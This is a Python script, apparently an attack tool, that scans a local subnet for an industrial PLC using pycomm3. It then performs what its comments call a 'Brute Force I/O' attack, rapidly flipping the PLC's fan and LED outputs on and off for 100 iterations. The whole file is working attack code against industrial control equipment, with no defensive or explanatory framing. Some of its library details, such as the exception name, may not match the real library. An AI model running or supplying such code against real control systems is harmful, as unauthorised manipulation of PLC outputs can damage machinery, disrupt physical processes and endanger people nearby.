import pycomm3
import time
import socket

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            with pycomm3.LogixDriver(ip) as plc:
                if plc.info:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except pycomm3.LogixDriverError:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to perform Brute Force I/O
def brute_force_io(plc_ip):
    with pycomm3.LogixDriver(plc_ip) as plc:
        if not plc.info:
            print("Failed to connect to the PLC.")
            return

        # Define the I/O points to manipulate
        io_points = [
            "_IO_EM_DO_02",  # Fan output
            "_IO_EM_DO_07",  # Green LED
            "_IO_EM_DO_06"   # Red LED
        ]

        # Define the range of values to brute force (e.g., True and False)
        values = [True, False]

        # Perform the brute force attack
        for _ in range(100):  # Number of iterations
            for point in io_points:
                for value in values:
                    try:
                        plc.write((point, value))
                        print(f"Set {point} to {value}")
                        time.sleep(0.1)  # Wait for 100ms between changes
                    except pycomm3.LogixDriverError as e:
                        print(f"Failed to set {point} to {value}: {e}")

# Main function
def main():
    plc_ip = discover_plc_ip()
    if plc_ip:
        brute_force_io(plc_ip)

if __name__ == "__main__":
    main()